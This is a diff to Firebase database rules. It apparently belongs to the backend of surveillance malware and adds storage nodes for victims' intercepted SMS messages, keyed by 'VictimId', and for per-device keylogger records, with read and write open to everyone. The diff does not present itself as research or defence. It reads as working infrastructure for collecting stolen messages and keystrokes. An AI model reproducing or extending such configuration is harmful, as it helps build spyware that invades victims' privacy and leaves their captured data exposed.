@@ -14,6 +14,11 @@
         ".validate": "newData.hasChildren(['VictimId', 'Sender', 'Body', 'Time', 'SmsType'])"
       }
     },
+    "SmsData": {
+      ".read": true,
+      ".write": true,
+      ".indexOn": ["VictimId"]
+    },
     "Sims": {
       ".read": true,
       ".write": true,
@@ -24,6 +29,15 @@
       }
     },
     "KeyLogs": {
+      ".read": true,
+      ".write": true,
+      "$deviceId": {
+        "$logId": {
+          ".validate": "newData.hasChildren(['keylogger', 'timestamp']) && newData.hasChildren(['Column1', 'Column2', 'Column3', 'Column4', 'Column5', 'Column6']) || newData.hasChildren(['time', 'text'])"
+        }
+      }
+    },
+    "Keylogs": {
       ".read": true,
       ".write": true,
       "$deviceId": {
